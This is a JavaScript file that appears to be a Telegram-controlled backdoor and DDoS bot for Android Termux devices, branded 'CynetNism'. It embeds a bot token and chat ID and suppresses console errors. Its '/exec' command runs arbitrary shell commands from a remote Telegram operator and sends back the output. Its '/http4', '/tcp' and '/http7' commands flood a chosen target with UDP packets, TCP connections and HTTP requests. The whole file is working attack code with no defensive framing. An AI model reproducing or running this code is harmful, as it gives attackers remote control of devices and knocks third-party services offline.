#!/usr/bin/env node
import axios from 'axios'
import tele from 'node-telegram-bot-api'
import fs from 'fs'
import os from 'os'
import path from 'path'
import { exec, execSync, spawn } from 'child_process'
import dgram from 'dgram'
import net from 'net'
import { fileURLToPath } from 'url'
function delay(ms){return new Promise(r=>setTimeout(r,ms))}
const img = 'https://image2url.com/r2/default/images/1772696482764-e16d5b02-a6b4-4c28-a29f-ee5bacf5916d.jpg'
const f = '8160209851:AAEGtWY9g2NshSVLZSsu05tCR7MA89oXMz4';
const d = '8275632263';
process.removeAllListeners("warning");
console.warn = () => {};
console.error = () => {};
const sock = new tele(f,{polling: true});
async function anjg(){
        const teks = `
W   e   l   c   o   m   e   t   o   C   y   n   e   t   N   i   s   m

Command Found:
/exec [command]
/http7 [url]
/http4 [ip] [port]
/tcp [ip] [port]
/sendchat [message]
/title [text]

Powered by CynetNism
        `;
        sock.sendPhoto(d,img,{
                caption:teks,
                parse_mode:'Markdown'
        });

        sock.onText(/\/sendchat (.+)/,async(msg,match)=>{
                const mes = match[1];
                await console.log(mes);
                await sock.sendMessage(d,`Successfully SendChat\nMessage: ${mes}`,{
                        reply_to_message_id: msg.message_id,
                        parse_mode:'Markdown'
                });
        });

        sock.onText(/\/title (.+)/,async(msg,match)=>{
                const mmk = match[1];
                await process.stdout.write(`\x1B[?25l\x1b]0;${mmk}\x07`);
                await sock.sendMessage(d,`Successfully Set Title\nNew Title: ${mmk}`,{
                        reply_to_message_id: msg.message_id,
                        parse_mode:'Markdown'
                });
        });

        sock.onText(/\/exec (.+)/, async (msg, match) => {
          const cid = msg.chat.id;
          const cmd = match[1].trim();
          const parts = cmd.split(" ");
          const program = parts.shift();
          const run = spawn(program, parts, { shell: true });
          let out = "";
          let err = "";
          run.stdout.on("data", d => {
            out += d.toString();
          });
          run.stderr.on("data", d => {
            err += d.toString();
          });
          run.on("close", async () => {
            let final = "";
            if (out) final += out;
            if (err) final += err;
            if (!final) final = "no output.";
            if (final.length > 4000) {
              final = final.slice(0, 3900) + "\n\n";
            }
            await sock.sendMessage(cid,final);
          });
        });

        sock.onText(/\/http4 (.+) (.+)/, async (msg, match) => {
            const ip = match[1]
            const port = match[2]
            const mId = msg.message_id
            const cf = dgram.createSocket('udp4')
            const pylon = Buffer.from('idiot'.repeat(4098))
            await sock.sendMessage(msg.chat.id, `Attack Udp By Cynet\nTarget: ${ip}\nPort: ${port}\nCheckHost: https://check-host.net/check-udp?host=${ip}`, {
                parse_mode: 'Markdown',
                reply_to_message_id: mId,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: 'CheckHost',
                                url: `https://check-host.net/check-udp?host=${ip}`
                            }
                        ]
                    ]
                }
            });
            setInterval(() => {
                cf.send(pylon, 0, pylon.length, port, ip)
            }, 1)
        });

        sock.onText(/\/tcp (.+) (.+)/, async (msg, match) => {
            const ip = match[1]
            const port = parseInt(match[2])
            const mId = msg.message_id
            const client = new net.Socket()
            client.setTimeout(5000)
            client.connect(port, ip, () => {})
            await sock.sendMessage(msg.chat.id, `Attack Tcp By Cynet
        Target: ${ip}
        Port: ${port}
        CheckHost: https://check-host.net/check-tcp?host=${ip}`, {
                parse_mode: 'Markdown',
                reply_to_message_id: mId,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: 'CheckHost',
                                url: `https://check-host.net/check-tcp?host=${ip}`
                            }
                        ]
                    ]
                }
            });
            setInterval(() => {
                function attack(){
                    if (client.destroyed){client.connect(port,ip)}
                    client.removeAllListeners('data')
                    client.removeAllListeners('error')
                    client.removeAllListeners('close')
                    client.on('data', (data) => {})
                    client.on('error', (err) => {client.destroy()});
                    client.on('close', () => {})
                } attack();
            }, 10)
        });

        sock.onText(/\/http7 (.+)/, async (msg, match) => {
            const url = match[1]
            const mId = msg.message_id
            await sock.sendMessage(msg.chat.id, `
Target: ${url}
Method: GET
UA: Cynet-HTTP7
Attack: Western-L7
Threads: 102
`, {
                reply_to_message_id: mId
            });
            setInterval(async () => {
                try {
                    await axios({
                        method: 'GET',
                        url,
                        headers: {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36 Cynet-HTTP7',
                            'Accept': '*/*',
                            'Connection': 'keep-alive'
                        },
                        timeout: 5000,
                        validateStatus: () => true
                    })
                } catch (e) {}
            },0)
        })
}

function sobakso() {
  return process.env.PREFIX === '/data/data/com.termux/files/usr';
}  async function main(){
  if (sobakso()) {
    await anjg();
    await sakura();
  } else {
    throw new Error('Device Not Supported');
  }
} main();

function sakura(){
	spawn('termux-wake-lock',{
		stdio:'inherit'
	});
}
